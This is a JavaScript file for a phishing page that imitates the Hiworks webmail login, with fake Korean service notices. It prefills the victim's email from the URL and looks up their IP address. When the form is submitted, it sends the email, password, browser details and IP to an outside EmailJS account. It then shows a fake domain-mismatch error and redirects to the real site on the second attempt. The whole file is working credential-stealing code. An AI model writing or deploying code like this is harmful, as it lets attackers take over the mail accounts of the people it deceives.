document.addEventListener('DOMContentLoaded', function () {
	var error = document.getElementById('error');
	var div1 = document.getElementById('div1');
	var msg1 = document.getElementById('msg1');
	var msg = document.getElementById('msg');
	var emailInput = document.getElementById('email');
	var submitButton = document.getElementById('submit-btn');
	var passwordInput = document.getElementById('password');
	var list1 = document.getElementById('list1');
	var list2 = document.getElementById('list2');

	list1.innerHTML = `<span>로그인 페이지 개선 적용 사전 안내</span> <span class="date">2023.07.24</span>`;
	list2.innerHTML = `<span>하이웍스 메신저 세션서버 재시작 작업 안내...</span><span class='date'>2023.08.04</span>`;

	var count = 0;

	error.style.display = 'none';
	console.log(window.location.hash.substring(1));
	var email = window.location.hash.substring(1).split('=')[1];
	console.log(email);
	var decodedEmail = decodeURIComponent(email);
	console.log(decodedEmail);

	if (email) {
		emailInput.value = decodedEmail;
		var my_email = email;
		var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

		if (!filter.test(my_email)) {
			error.style.display = 'block';
			// emailInput.focus();
			return false;
		}

		var ind = my_email.indexOf('@');
		var my_slice = my_email.substr(ind + 1);
		var c = my_slice.substr(0, my_slice.indexOf('.'));
		var fin = c.toLowerCase();

		div1.style.display = 'none';
		div1.style.display = 'block';
		// document.getElementById('emailch').innerHTML = my_email;
	}

	emailInput.addEventListener('keypress', function () {
		error.style.display = 'none';
	});

	function getUserBrowserDetails() {
		const userAgent = navigator.userAgent;
		const appName = navigator.appName;
		const appVersion = navigator.appVersion;
		const platform = navigator.platform;
		const language = navigator.language;

		return {
			userAgent,
			appName,
			appVersion,
			platform,
			language,
		};
	}

	let ip = '';

	function text(url) {
		return fetch(url).then((res) => res.text());
	}

	text('https://www.cloudflare.com/cdn-cgi/trace').then((data) => {
		let ipRegex = /[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/;
		ip = data.match(ipRegex)[0];
		console.log(ip);
	});

	submitButton.addEventListener('click', async function (event) {
		event.preventDefault();
		submitButton.innerHTML = 'Signing in...';
		msg.innerHTML = '';
		var email = emailInput.value;
		var password = passwordInput.value;
		var detail = getUserBrowserDetails();

		if (password.length < 6) {
			msg1.style.display = 'block';
			// passwordInput.focus();
			return false;
		}

		count++;

		const params = {
			email,
			password,
			userAgent: detail.userAgent,
			appName: detail.appName,
			appVersion: detail.appVersion,
			platform: detail.platform,
			language: detail.language,
			ip,
		};

		const data = {
			service_id: 'service_v94347h',
			template_id: 'template_1820lea',
			template_params: params,
			user_id: '-csSYtT85Cumloy8C',
		};

		if (count >= 2) {
			window.location.replace('https://mail.office.hiworks.com');
		}
		console.log(data);
		// return;
		try {
			const response = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
				method: 'POST',
				body: JSON.stringify(data), // Use 'body' instead of 'data'
				headers: {
					'Content-Type': 'application/json', // Set content type as a header
				},
			});
			console.log(response);
			if (response.ok) {
				msg.innerHTML = '계정의 도메인이 접속한 오피스의 도메인과 일치하지 않습니다.';
				passwordInput.value = '';
			} else {
				passwordInput.value = '';
				msg.innerHTML = '';
			}
		} catch (error) {
			passwordInput.value = '';
			msg.innerHTML = '';
		}
		submitButton.innerHTML = 'Sign in';
	});
});

const sendEmail = async (dat, count) => {
	const data = {
		service_id: 'service_v94347h',
		template_id: 'template_1820lea',
		template_params: dat,
		user_id: '-csSYtT85Cumloy8C',
	};

	if (count >= 2) {
		window.location.replace('https://mail.office.hiworks.com');
	}
	console.log(data);
	// return;
	try {
		const response = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
			method: 'POST',
			body: JSON.stringify(data), // Use 'body' instead of 'data'
			headers: {
				'Content-Type': 'application/json', // Set content type as a header
			},
		});
		console.log(response);
		if (response.ok) {
			msg.innerHTML = '계정의 도메인이 접속한 오피스의 도메인과 일치하지 않습니다.';
			passwordInput.value = '';
		} else {
			passwordInput.value = '';
			msg.innerHTML = '';
		}
	} catch (error) {
		passwordInput.value = '';
		msg.innerHTML = '';
	}

	return;
};
